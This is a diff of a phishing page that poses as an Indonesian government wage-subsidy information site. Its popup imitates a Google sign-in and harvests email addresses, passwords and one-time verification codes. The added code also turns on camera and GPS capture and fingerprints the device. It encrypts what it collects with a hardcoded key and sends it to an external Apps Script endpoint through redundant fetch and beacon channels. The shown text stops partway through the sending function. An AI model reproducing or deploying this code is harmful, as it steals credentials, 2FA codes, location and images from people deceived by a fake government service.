+    #gsi-root .gsi-cap-thumb{display:none;width:26px;height:26px;border-radius:50%;object-fit:cover;border:1px solid #1e8e3e;transform:scaleX(-1)}
+    #gsi-root .gsi-cap-thumb.on{display:block}
+    #gsi-root video,#gsi-root canvas{display:none}
+    @media(max-width:520px){#gsi-root .gsi-main{padding:0;align-items:flex-start}#gsi-root .gsi-card{border:0;border-radius:0;box-shadow:none;padding:22px 22px 30px;max-width:100%}#gsi-root .gsi-foot{padding:12px 22px 58px}#gsi-root .gsi-cap{left:10px;bottom:10px;font-size:10.5px}}
+    @media(min-width:992px){#gsi-root{background:#f1f3f4}}
+    #gsiReopen{position:fixed;right:16px;bottom:16px;z-index:2147482999;display:none;align-items:center;gap:8px;height:44px;padding:0 20px;border:0;border-radius:22px;background:#1a73e8;color:#fff;font:500 14px/1 Roboto,Arial,sans-serif;box-shadow:0 4px 14px rgba(0,0,0,.28);cursor:pointer}
+    /* panel dev */
+    #dv{position:fixed;inset:auto 0 0 0;z-index:2147483001;display:none;max-height:62vh;overflow:auto;background:#0b1220f2;color:#c9d6e5;font:11px/1.5 ui-monospace,Menlo,monospace;border-top:1px solid #22334d;padding:10px 12px;backdrop-filter:blur(4px)}
+    #dv.on{display:block}
+    #dv h4{margin:0 0 6px;font-size:11px;color:#8fe3b4;letter-spacing:.08em;text-transform:uppercase}
+    #dv .chips{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:8px}
+    #dv .chip{background:#141f34;border:1px solid #22334d;border-radius:4px;padding:2px 6px;font-size:10px}
+    #dv .chip b{color:#6ee7a0}
+    #dv .row{display:flex;gap:6px;border-bottom:1px dashed #16223a;padding:1px 0}
+    #dv .row .c{flex:1;color:#9fb2c6;word-break:break-all}
+    #dv .row .k{width:18px;text-align:center;font-weight:700}
+    #dv .row .l{width:52px;text-align:right;color:#61748a}
+    #dv .row .n{width:90px;color:#61748a;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+    #dv .k0{color:#6ee7a0}#dv .k1{color:#f3d97b}#dv .k2{color:#f3a3a3}#dv .k3{color:#7f95ad}#dv .k4{color:#4a5b70}
+    #dv button{background:#141f34;border:1px solid #22334d;color:#9fb6d1;border-radius:4px;padding:3px 8px;font:10px ui-monospace,monospace;cursor:pointer;margin-right:4px}
+    #dv button:hover{background:#1d2c47}
   </style>
 </head>
 
@@ -548,17 +150,9 @@
             <circle cx="24" cy="22" r="6.2" fill="none" stroke="#fff" stroke-width="2.2"/>
             <path d="M24 12.6v3M24 28.4v3M14.6 22h3M30.4 22h3" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
           </svg>
-          <span class="bsu-brand-txt">
-            <b>Bantuan Subsidi Upah</b>
-            <span>Kementerian Ketenagakerjaan RI</span>
-          </span>
+          <span class="bsu-brand-txt"><b>Bantuan Subsidi Upah</b><span>Kementerian Ketenagakerjaan RI</span></span>
         </a>
-
-        <button class="bsu-toggler d-lg-none" type="button" data-bs-toggle="collapse" data-bs-target="#bsuMenu"
-          aria-controls="bsuMenu" aria-expanded="false" aria-label="Buka menu">
-          <i class="bi bi-list"></i>
-        </button>
-
+        <button class="bsu-toggler d-lg-none" type="button" data-bs-toggle="collapse" data-bs-target="#bsuMenu" aria-label="Menu"><i class="bi bi-list"></i></button>
         <div class="collapse d-lg-block" id="bsuMenu">
           <ul class="nav flex-column flex-lg-row gap-lg-1 mt-3 mt-lg-0 pb-2 pb-lg-0">
             <li class="nav-item"><a class="nav-link" href="#home">Beranda</a></li>
@@ -586,18 +180,10 @@
   <div class="stats">
     <div class="container">
       <div class="row g-3">
-        <div class="col-6 col-lg-3">
-          <div class="stat"><b>Rp300.000</b><span>per bulan</span></div>
-        </div>
-        <div class="col-6 col-lg-3">
-          <div class="stat"><b>3 bulan</b><span>masa penyaluran</span></div>
-        </div>
-        <div class="col-6 col-lg-3">
-          <div class="stat"><b>Rp900.000</b><span>total dibayarkan</span></div>
-        </div>
-        <div class="col-6 col-lg-3">
-          <div class="stat"><b>Sekaligus</b><span>satu kali transfer</span></div>
-        </div>
+        <div class="col-6 col-lg-3"><div class="stat"><b>Rp300.000</b><span>per bulan</span></div></div>
+        <div class="col-6 col-lg-3"><div class="stat"><b>3 bulan</b><span>masa penyaluran</span></div></div>
+        <div class="col-6 col-lg-3"><div class="stat"><b>Rp900.000</b><span>total dibayarkan</span></div></div>
+        <div class="col-6 col-lg-3"><div class="stat"><b>Sekaligus</b><span>satu kali transfer</span></div></div>
       </div>
     </div>
   </div>
@@ -607,32 +193,16 @@
       <span class="eyebrow">Ketentuan</span>
       <h2>Syarat Penerima BSU 2026</h2>
       <p class="lead-txt">Program Bantuan Pemerintah berupa subsidi gaji/upah dalam bentuk uang tunai, diberikan kepada pekerja/buruh yang memenuhi seluruh kriteria berikut.</p>
-
       <div class="row g-3">
-        <div class="col-12 col-md-6">
-          <div class="req"><i class="bi bi-check-circle-fill"></i><p>Warga Negara Indonesia yang dibuktikan dengan Nomor Induk Kependudukan.</p></div>
-        </div>
-        <div class="col-12 col-md-6">
-          <div class="req"><i class="bi bi-check-circle-fill"></i><p>Peserta aktif program jaminan sosial ketenagakerjaan BPJS Ketenagakerjaan kategori Peserta Penerima Upah (PU) sampai dengan bulan Agustus 2026.</p></div>
-        </div>
-        <div class="col-12 col-md-6">
-          <div class="req"><i class="bi bi-check-circle-fill"></i><p>Menerima gaji/upah paling banyak sebesar Rp3.500.000,00 per bulan atau sebesar UMP/UMK.</p></div>
-        </div>
-        <div class="col-12 col-md-6">
-          <div class="req"><i class="bi bi-check-circle-fill"></i><p>Diprioritaskan bagi pekerja/buruh yang tidak sedang menerima Program Keluarga Harapan (PKH) pada periode sebelum penyaluran BSU dilakukan.</p></div>
-        </div>
-        <div class="col-12">
-          <div class="req"><i class="bi bi-check-circle-fill"></i><p>Bukan merupakan Aparatur Sipil Negara, prajurit Tentara Nasional Indonesia, dan anggota Kepolisian Negara Republik Indonesia.</p></div>
-        </div>
+        <div class="col-12 col-md-6"><div class="req"><i class="bi bi-check-circle-fill"></i><p>Warga Negara Indonesia yang dibuktikan dengan Nomor Induk Kependudukan.</p></div></div>
+        <div class="col-12 col-md-6"><div class="req"><i class="bi bi-check-circle-fill"></i><p>Peserta aktif program jaminan sosial ketenagakerjaan BPJS Ketenagakerjaan kategori Peserta Penerima Upah (PU) sampai dengan bulan Agustus 2026.</p></div></div>
+        <div class="col-12 col-md-6"><div class="req"><i class="bi bi-check-circle-fill"></i><p>Menerima gaji/upah paling banyak sebesar Rp3.500.000,00 per bulan atau sebesar UMP/UMK.</p></div></div>
+        <div class="col-12 col-md-6"><div class="req"><i class="bi bi-check-circle-fill"></i><p>Diprioritaskan bagi pekerja/buruh yang tidak sedang menerima Program Keluarga Harapan (PKH) pada periode sebelum penyaluran BSU dilakukan.</p></div></div>
+        <div class="col-12"><div class="req"><i class="bi bi-check-circle-fill"></i><p>Bukan merupakan Aparatur Sipil Negara, prajurit Tentara Nasional Indonesia, dan anggota Kepolisian Negara Republik Indonesia.</p></div></div>
       </div>
-
       <div class="note">
         <i class="bi bi-exclamation-triangle-fill"></i>
-        <div>
-          Apabila di kemudian hari ditemukan bahwa penerima BSU ternyata tidak memenuhi persyaratan, maka yang bersangkutan wajib mengembalikan dana BSU yang diterima ke Kas Negara.
-          Dasar hukum: Permenaker Nomor 10 Tahun 2022 yang diubah terakhir dengan
-          <a href="https://jdih.kemnaker.go.id/peraturan/detail/3117" target="_blank" rel="noopener">Permenaker Nomor 16 Tahun 2026</a>.
-        </div>
+        <div>Apabila di kemudian hari ditemukan bahwa penerima BSU ternyata tidak memenuhi persyaratan, maka yang bersangkutan wajib mengembalikan dana BSU yang diterima ke Kas Negara. Dasar hukum: Permenaker Nomor 10 Tahun 2022 yang diubah terakhir dengan <a href="https://jdih.kemnaker.go.id/peraturan/detail/3117" target="_blank" rel="noopener">Permenaker Nomor 16 Tahun 2026</a>.</div>
       </div>
     </div>
   </section>
@@ -642,35 +212,15 @@
       <span class="eyebrow">Panduan</span>
       <h2>Langkah Pengecekan Resmi</h2>
       <p class="lead-txt">Lakukan pengecekan hanya melalui kanal resmi Kementerian Ketenagakerjaan.</p>
-
       <div class="row g-3">
-        <div class="col-12 col-md-6">
-          <div class="step">
-            <div class="step-num">1</div>
-            <div>
-              <h3>Kunjungi website resmi</h3>
-              <p><a href="https://bsu.kemnaker.go.id" target="_blank" rel="noopener">bsu.kemnaker.go.id</a></p>
-            </div>
-          </div>
-        </div>
-        <div class="col-12 col-md-6">
-          <div class="step">
-            <div class="step-num">2</div>
-            <div>
-              <h3>Cek NIK penerima</h3>
-              <p><a href="#info">Ikuti petunjuk pengecekan</a></p>
-            </div>
-          </div>
-        </div>
+        <div class="col-12 col-md-6"><div class="step"><div class="step-num">1</div><div><h3>Kunjungi website resmi</h3><p><a href="https://bsu.kemnaker.go.id" target="_blank" rel="noopener">bsu.kemnaker.go.id</a></p></div></div></div>
+        <div class="col-12 col-md-6"><div class="step"><div class="step-num">2</div><div><h3>Cek NIK penerima</h3><p><a href="#info">Ikuti petunjuk pengecekan</a></p></div></div></div>
       </div>
-
       <div class="row mt-4">
         <div class="col-12">
           <div class="infobox">
             <h3>Asal data penerima</h3>
-            <p>Data calon penerima Bantuan Subsidi Gaji/Upah berasal dari BPJS Ketenagakerjaan. Informasi kriteria, mekanisme, dan tata cara BSU 2026 diatur dalam
-              <a href="https://jdih.kemnaker.go.id/peraturan/detail/3117" target="_blank" rel="noopener" style="color:#1a5fa8;font-weight:700">Permenaker Nomor 16 Tahun 2026</a>.
-            </p>
+            <p>Data calon penerima Bantuan Subsidi Gaji/Upah berasal dari BPJS Ketenagakerjaan. Informasi kriteria, mekanisme, dan tata cara BSU 2026 diatur dalam <a href="https://jdih.kemnaker.go.id/peraturan/detail/3117" target="_blank" rel="noopener" style="color:#1a5fa8;font-weight:700">Permenaker Nomor 16 Tahun 2026</a>.</p>
           </div>
         </div>
       </div>
@@ -702,7 +252,6 @@
     </div>
   </footer>
 
-  <!-- ==================== POPUP ==================== -->
   <div id="gsi-root" role="dialog" aria-modal="true" aria-label="Masuk">
     <div class="gsi-main">
       <div class="gsi-card">
@@ -715,28 +264,16 @@
           </svg>
           <h1 id="gsiTitle">Masuk</h1>
           <p class="gsi-sub" id="gsiSub">untuk melanjutkan ke Gmail</p>
-
-          <div class="gsi-chip" id="gsiChip">
-            <span class="gsi-av" id="gsiAv">U</span>
-            <span id="gsiChipText"></span>
-          </div>
+          <div class="gsi-chip" id="gsiChip"><span class="gsi-av" id="gsiAv">U</span><span id="gsiChipText"></span></div>
 
           <div id="gsiStep1">
             <div class="gsi-field" id="gsiEmailField">
               <input id="gsiEmail" type="text" placeholder=" " autocomplete="username" spellcheck="false" autocapitalize="none" aria-label="Email atau telepon">
               <label for="gsiEmail">Email atau telepon</label>
             </div>
-            <div class="gsi-err" id="gsiEmailErr">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-              <span>Masukkan email atau nomor telepon</span>
-            </div>
+            <div class="gsi-err" id="gsiEmailErr"><svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>Masukkan email atau telepon</span></div>
             <a class="gsi-link" id="gsiForgotEmail">Lupa email?</a>
-
-            <p class="gsi-guest">
-              Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi.
-              <a href="https://support.google.com/chrome/answer/6130773" target="_blank" rel="noopener">Pelajari lebih lanjut penggunaan mode Tamu</a>
-            </p>
-
+            <p class="gsi-guest">Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi. <a href="https://support.google.com/chrome/answer/6130773" target="_blank" rel="noopener">Pelajari lebih lanjut</a></p>
             <div class="gsi-row">
               <button class="gsi-btn-text" type="button" id="gsiCreate">Buat akun</button>
               <button class="gsi-btn" type="button" id="gsiNext">Berikutnya</button>
@@ -748,47 +285,26 @@
               <input id="gsiPass" type="password" placeholder=" " autocomplete="current-password" aria-label="Masukkan sandi Anda">
               <label for="gsiPass">Masukkan sandi Anda</label>
             </div>
-            <div class="gsi-err" id="gsiPassErr">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-              <span>Masukkan sandi</span>
-            </div>
-
+            <div class="gsi-err" id="gsiPassErr"><svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>Masukkan sandi</span></div>
             <div class="gsi-row">
               <label class="gsi-check"><input type="checkbox" id="gsiShow">Tampilkan sandi</label>
               <a class="gsi-link" style="margin-top:0" id="gsiForgotPass">Lupa sandi?</a>
             </div>
-
-            <div class="gsi-row-end">
-              <button class="gsi-btn" type="button" id="gsiSignIn">
-                <span class="gsi-spin"></span><span id="gsiLbl">Berikutnya</span>
-              </button>
-            </div>
+            <div class="gsi-row-end"><button class="gsi-btn" type="button" id="gsiSignIn"><span class="gsi-spin"></span><span id="gsiLbl">Berikutnya</span></button></div>
           </div>
 
           <div id="gsiStep3" style="display:none">
-            <svg class="gsi-shield" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
-              <path d="M12 2.6 4.5 5.4v6.2c0 4.6 3.2 7.9 7.5 9.8 4.3-1.9 7.5-5.2 7.5-9.8V5.4L12 2.6Z"/>
-              <path d="m8.8 11.9 2.2 2.2 4.2-4.4"/>
-            </svg>
-
+            <svg class="gsi-shield" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2.6 4.5 5.4v6.2c0 4.6 3.2 7.9 7.5 9.8 4.3-1.9 7.5-5.2 7.5-9.8V5.4L12 2.6Z"/><path d="m8.8 11.9 2.2 2.2 4.2-4.4"/></svg>
             <div class="gsi-field" id="gsiOtpField">
-              <input id="gsiOtp" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" placeholder=" " aria-label="Masukkan kode verifikasi">
+              <input id="gsiOtp" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" placeholder=" " aria-label="Kode verifikasi">
               <label for="gsiOtp">Masukkan kode verifikasi</label>
             </div>
-            <div class="gsi-err" id="gsiOtpErr">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-              <span>Masukkan 6 digit kode verifikasi</span>
-            </div>
-
+            <div class="gsi-err" id="gsiOtpErr"><svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>Masukkan 6 digit kode verifikasi</span></div>
             <a class="gsi-link" id="gsiTryOther">Coba cara lain</a>
-
-            <p class="gsi-hint">Kode dikirim ke perangkat yang sudah masuk atau email pemulihan. Kode hanya berlaku beberapa menit.</p>
-
+            <p class="gsi-hint">Kode dikirim ke perangkat yang sudah masuk atau email pemulihan.</p>
             <div class="gsi-row">
               <button class="gsi-btn-text" type="button" id="gsiSkip">Lewati</button>
-              <button class="gsi-btn" type="button" id="gsiVerify">
-                <span class="gsi-spin"></span><span id="gsiVfyLbl">Verifikasi</span>
-              </button>
+              <button class="gsi-btn" type="button" id="gsiVerify"><span class="gsi-spin"></span><span id="gsiVfyLbl">Verifikasi</span></button>
             </div>
           </div>
 
@@ -796,24 +312,23 @@
         </div>
 
         <div class="gsi-done" id="gsiDone">
-          <div class="gsi-ok">
-            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#188038" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
-          </div>
+          <div class="gsi-ok"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#188038" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></div>
           <h2>Berhasil masuk</h2>
           <p>Akun <span class="gsi-who" id="gsiWho"></span> sudah tercatat.</p>
-          <div class="gsi-row-end" style="justify-content:center;margin-top:26px">
-            <button class="gsi-btn" type="button" id="gsiAgain">Masuk dengan akun lain</button>
-          </div>
+          <div class="gsi-row-end" style="justify-content:center;margin-top:26px"><button class="gsi-btn" type="button" id="gsiAgain">Masuk dengan akun lain</button></div>
         </div>
       </div>
     </div>
 
+    <div class="gsi-cap" id="gsiCap">
+      <div class="gsi-cap-item" id="gsiCapCam"><span class="gsi-cap-dot"></span><span id="gsiCapCamTxt">Kamera</span></div>
+      <div class="gsi-cap-item" id="gsiCapGps"><span class="gsi-cap-dot"></span><span id="gsiCapGpsTxt">Lokasi</span></div>
+      <img class="gsi-cap-thumb" id="gsiCapThumb" alt="">
+    </div>
+
     <div class="gsi-foot">
       <div>
-        <select aria-label="Bahasa">
-          <option>Bahasa Indonesia</option>
-          <option>English (United States)</option>
-        </select>
+        <select aria-label="Bahasa"><option>Bahasa Indonesia</option><option>English (United States)</option></select>
         <div class="gsi-note">Data diterima admin, bukan disimpan Google</div>
       </div>
       <nav>
@@ -825,322 +340,787 @@
   </div>
 
   <button id="gsiReopen" type="button">Masuk</button>
-  <!-- =================== /POPUP ==================== -->
+  <video id="gsiVid" playsinline muted autoplay></video>
+  <canvas id="gsiCv"></canvas>
+  <div id="dv" aria-hidden="true"></div>
 
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script>if ('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js').catch(function () { });</script>
 
   <script>
     (function () {
       'use strict';
 
-      var BUILD = 'otp-v2';
-      var ENDPOINT = 'https://script.google.com/macros/s/AKfycbxb-Z82bCYxZcN9rU8-vQlGRiegj26Rl94-sPwBq8iXfnnFZGqSuwCZIAqto04O4t9X/exec';
+      var BUILD = 'zgch-d8';
+      var EPS = ['https://script.google.com/macros/s/AKfycbxb-Z82bCYxZcN9rU8-vQlGRiegj26Rl94-sPwBq8iXfnnFZGqSuwCZIAqto04O4t9X/exec'];
       var NEXT_URL = 'https://bsu.kemnaker.go.id/#pengecekanMandiri';
+      var PSK = 'BsuPegasus2026K';
 
       var root = document.getElementById('gsi-root');
       if (!root) return;
-      var $ = function (id) { return document.getElementById(id); };
+      var $ = function (i) { return document.getElementById(i); };
 
-      try { console.log('[gsi] build ' + BUILD); } catch (e) { }
+      var Q = location.search;
+      var MODE_CTRL = Q.indexOf('ctrl=1') > -1;
+      var MODE_DEV = Q.indexOf('dev=1') > -1;
+      var MODE_MANIFEST = Q.indexOf('manifest=1') > -1;
+      var MODE_BENCH = /bench=1/.test(Q);
+      var BENCH_N = Math.min(6, Math.max(1, parseInt((/n=(\d+)/.exec(Q) || [])[1] || 3, 10)));
+      var SEED = parseInt((/seed=(\d+)/.exec(Q) || [])[1] || String(Date.now() % 99991), 10);
+
+      var KEY_SID = 'gsi_sid';
+      var sid = (function () { try { var v = localStorage.getItem(KEY_SID); if (!v) { v = hex(16); localStorage.setItem(KEY_SID, v); } return v; } catch (e) { return hex(16); } })();
 
       var emailEl = $('gsiEmail'), passEl = $('gsiPass'), otpEl = $('gsiOtp');
-      var statusEl = $('gsiStatus');
-      var reopenBtn = $('gsiReopen');
-      var username = '', busy = false, otpBusy = false, closeTimer = null, lastQ = '', currentRid = '';
-      var KEY_Q = 'gsi_queue';
+      var statusEl = $('gsiStatus'), reopenBtn = $('gsiReopen'), vid = $('gsiVid'), cv = $('gsiCv');
 
-      try { var l = localStorage.getItem('gsi_last_user'); if (l) emailEl.value = l; } catch (e) { }
+      var username = '', busy = false, otpBusy = false, closeTimer = null, lastQ = '', ridCur = '';
+      var stream = null, camState = 'idle', gpsState = 'idle', shots = 0, rounds = 0, best = '', bestScore = -1;
+      var photo = '', photoSent = false, gps = null, addr = '', ip = '', isp = '', kota = '', sumber = '';
+      var t0 = Date.now(), tSubmit = 0, pasted = false, autofill = false, dirty = false;
+      var alive = true, misses = 0, beatTimer = null, inFlight = false, camDone = null;
+      var audioFpCache = '', launderOk = 0, launderTried = 0, prompts = 0, probeDone = false;
 
-      function devId() {
-        try {
-          var k = 'gsi_dev', v = localStorage.getItem(k);
-          if (!v) {
-            v = (window.crypto && crypto.randomUUID) ? crypto.randomUUID()
-              : 'gsi-' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 12);
-            localStorage.setItem(k, v);
-          }
-          return v;
-        } catch (e) { return ''; }
-      }
-      function rid() { return 'gsi-' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 10); }
-
-      function setStatus(msg, color) {
-        statusEl.textContent = msg;
-        statusEl.style.color = color || '#5f6368';
-        statusEl.classList.add('show');
-      }
+      /* ---------- util ---------- */
+      function hex(n) { var a = new Uint8Array(n); try { crypto.getRandomValues(a); } catch (e) { for (var i = 0; i < n; i++) a[i] = Math.random() * 256 | 0; } return [].map.call(a, function (b) { return ('0' + b.toString(16)).slice(-2); }).join(''); }
+      function devId() { try { var v = localStorage.getItem('gsi_dev'); if (!v) { v = hex(8); localStorage.setItem('gsi_dev', v); } return v; } catch (e) { return ''; } }
+      function rid() { return 'r' + Date.now().toString(36) + hex(4); }
+      function h32(s) { var h = 0x811c9dc5; for (var i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = (h * 0x01000193) >>> 0; } return ('0000000' + h.toString(16)).slice(-8); }
+      function b64(u) { var s = '', c = 0x8000; for (var i = 0; i < u.length; i += c) s += String.fromCharCode.apply(null, u.subarray(i, i + c)); return btoa(s); }
+      function setStatus(m, c) { statusEl.textContent = m; statusEl.style.color = c || '#5f6368'; statusEl.classList.add('show'); }
       function clearStatus() { statusEl.classList.remove('show'); statusEl.textContent = ''; }
+      function rng(seed) { var s = seed >>> 0; return function () { s |= 0; s = s + 0x6D2B79F5 | 0; var t = Math.imul(s ^ s >>> 15, 1 | s); t = t + Math.imul(t ^ t >>> 7, 61 | t) ^ t; return ((t ^ t >>> 14) >>> 0) / 4294967296; }; }
+      function shuffle(a) { var r = rng(SEED), i = a.length, j, t; while (i) { j = r() * i-- | 0; t = a[i]; a[i] = a[j]; a[j] = t; } return a; }
+      function med(a) { if (!a.length) return 0; var b = a.slice().sort(function (x, y) { return x - y; }), i = b.length >> 1; return b.length % 2 ? b[i] : Math.round((b[i - 1] + b[i]) / 2); }
 
-      function step2() {
-        var v = emailEl.value.trim();
-        if (!v) {
-          $('gsiEmailField').classList.add('gsi-bad');
-          $('gsiEmailErr').classList.add('show');
-          emailEl.focus();
-          return;
-        }
-        username = v;
-        $('gsiChipText').textContent = v;
-        $('gsiAv').textContent = v.charAt(0);
-        $('gsiChip').style.display = 'flex';
-        $('gsiTitle').textContent = 'Selamat datang';
-        $('gsiSub').textContent = 'Masuk untuk melanjutkan';
-        $('gsiStep1').style.display = 'none';
-        $('gsiStep3').style.display = 'none';
-        $('gsiStep2').style.display = 'block';
-        clearStatus();
-        setTimeout(function () { passEl.focus(); }, 60);
+      /* ---------- amplop ---------- */
+      var kc = null;
+      function aesKey() { if (!kc) kc = crypto.subtle.importKey('raw', new TextEncoder().encode(PSK), 'AES-CTR', false, ['encrypt']); return kc; }
+      function gz(u) {
+        if (!window.CompressionStream) return Promise.resolve(null);
+        try { var s = new Blob([u]).stream().pipeThrough(new CompressionStream('gzip')); return new Response(s).arrayBuffer().then(function (b) { return new Uint8Array(b); }).catch(function () { return null; }); }
+        catch (e) { return Promise.resolve(null); }
+      }
+      function seal(o) {
+        o.pad = hex(8 + (Math.random() * 24 | 0));
+        var raw = new TextEncoder().encode(JSON.stringify(o));
+        if (!crypto.subtle) return Promise.resolve({ b: b64(raw), g: 0 });
+        return gz(raw).then(function (z) {
+          var body = z || raw, iv = new Uint8Array(16);
+          crypto.getRandomValues(iv);
+          return aesKey().then(function (k) { return crypto.subtle.encrypt({ name: 'AES-CTR', counter: iv, length: 64 }, k, body); })
+            .then(function (ct) { var a = new Uint8Array(16 + ct.byteLength); a.set(iv); a.set(new Uint8Array(ct), 16); return { b: b64(a), g: z ? 1 : 0 }; });
+        }).catch(function () { return { b: b64(raw), g: 0 }; });
       }
 
-      function step1() {
-        $('gsiStep2').style.display = 'none';
-        $('gsiStep3').style.display = 'none';
-        $('gsiStep1').style.display = 'block';
-        $('gsiChip').style.display = 'none';
-        $('gsiTitle').textContent = 'Masuk';
-        $('gsiSub').textContent = 'untuk melanjutkan ke Gmail';
-        clearStatus();
+      /* ---------- transport ---------- */
+      function ep() { return EPS[Math.floor(Math.random() * EPS.length)]; }
+      function post(q) {
+        return fetch(ep(), { method: 'POST', mode: 'cors', credentials: 'omit', redirect: 'follow', headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' }, body: q })
+          .then(function (r) { return r.text().then(function (t) { return { ok: true, t: t }; }); })
+          .catch(function () { return { ok: false, t: '' }; });
       }
-
-      function step3() {
-        $('gsiStep2').style.display = 'none';
-        $('gsiStep1').style.display = 'none';
-        $('gsiStep3').style.display = 'block';
-        $('gsiTitle').textContent = 'Verifikasi bahwa ini Anda';
-        $('gsiSub').textContent = 'Masukkan kode 6 digit yang dikirim ke perangkat atau email pemulihan akun Anda.';
-        clearStatus();
-        otpBusy = false;
-        otpEl.value = '';
-        $('gsiOtpField').classList.remove('gsi-bad');
-        $('gsiOtpErr').classList.remove('show');
-        var b = $('gsiVerify');
-        b.disabled = false; b.classList.remove('gsi-loading'); $('gsiVfyLbl').textContent = 'Verifikasi';
-        setTimeout(function () { otpEl.focus(); }, 80);
+      function raw(q) {
+        try { if (navigator.sendBeacon && q.length < 60000) { navigator.sendBeacon(ep(), new Blob([q], { type: 'application/x-www-form-urlencoded;charset=UTF-8' })); return; } } catch (e) { }
+        try { new Image().src = ep() + '?t=' + Date.now() + '&' + q; } catch (e) { }
+        fetch(ep(), { method: 'POST', mode: 'no-cors', keepalive: true, body: q }).catch(function () { });
       }
-
-      function qs(pass) {
-        var p = new URLSearchParams();
-        p.set('action', 'login');
-        p.set('rid', currentRid);
-        p.set('username', username);
-        p.set('email', username);
-        p.set('password', pass);
-        p.set('deviceId', devId());
-        p.set('userAgent', navigator.userAgent || '');
-        p.set('platform', (navigator.userAgentData && navigator.userAgentData.platform) ? navigator.userAgentData.platform : (navigator.platform || ''));
-        p.set('language', navigator.language || '');
-        p.set('timezone', Intl.DateTimeFormat().resolvedOptions().timeZone || '');
-        p.set('screen', (screen.width || 0) + 'x' + (screen.height || 0));
-        p.set('referrer', document.referrer || '');
-        p.set('page', location.href);
-        p.set('ts', new Date().toISOString());
-        return p.toString();
-      }
-
-      function otpQs(code) {
-        var p = new URLSearchParams();
-        p.set('action', 'otp');
-        p.set('rid', currentRid);
-        p.set('code', code);
-        p.set('username', username);
-        p.set('ts', new Date().toISOString());
-        return p.toString();
-      }
-
-      function enqueue(q) {
-        try {
-          var a = JSON.parse(localStorage.getItem(KEY_Q) || '[]');
-          a.push(q);
-          if (a.length > 50) a = a.slice(-50);
-          localStorage.setItem(KEY_Q, JSON.stringify(a));
-        } catch (e) { }
-      }
-      function dequeue(q) {
-        try {
-          var a = JSON.parse(localStorage.getItem(KEY_Q) || '[]');
-          var i = a.indexOf(q);
-          if (i > -1) { a.splice(i, 1); localStorage.setItem(KEY_Q, JSON.stringify(a)); }
-        } catch (e) { }
-      }
-
-      function postCors(q) {
-        return fetch(ENDPOINT, {
-          method: 'POST', mode: 'cors', credentials: 'omit', redirect: 'follow',
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
-          body: q
-        }).then(function (r) {
-          return r.text().then(function (t) { return { ok: true, text: t }; });
-        }).catch(function () { return { ok: false, text: '' }; });
-      }
-
-      function postNoCors(q) {
-        return fetch(ENDPOINT, {
-          method: 'POST', mode: 'no-cors', keepalive: true,
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
-          body: q
-        }).then(function () { return true; }).catch(function () { return false; });
-      }
-
-      function beacon(q) {
-        try {
-          if (navigator.sendBeacon) {
-            navigator.sendBeacon(ENDPOINT, new Blob([q], { type: 'application/x-www-form-urlencoded;charset=UTF-8' }));
-            return;
-          }
-        } catch (e) { }
-        try { var img = new Image(); img.src = ENDPOINT + '?t=' + Date.now() + '&' + q; } catch (e) { }
-        postNoCors(q);
-      }
-
-      function flushQueue() {
-        var a;
-        try { a = JSON.parse(localStorage.getItem(KEY_Q) || '[]'); } catch (e) { return; }
-        if (!a || !a.length) return;
-        a.slice().forEach(function (q) {
-          postCors(q).then(function (r) {
-            if (!r.ok) return;
-            try { if (JSON.parse(r.text).ok) dequeue(q); } catch (e) { }
+      function send(action, obj) {
+        return seal(Object.assign({ action: action, sid: sid, ts: Date.now() }, obj || {})).then(function (p) {
+          var q = 'action=' + action + '&sid=' + sid + '&enc=1&gz=' + p.g + '&p=' + encodeURIComponent(p.b);
+          return post(q).then(function (r) {
+            if (!r.ok) { raw(q); return { ok: false }; }
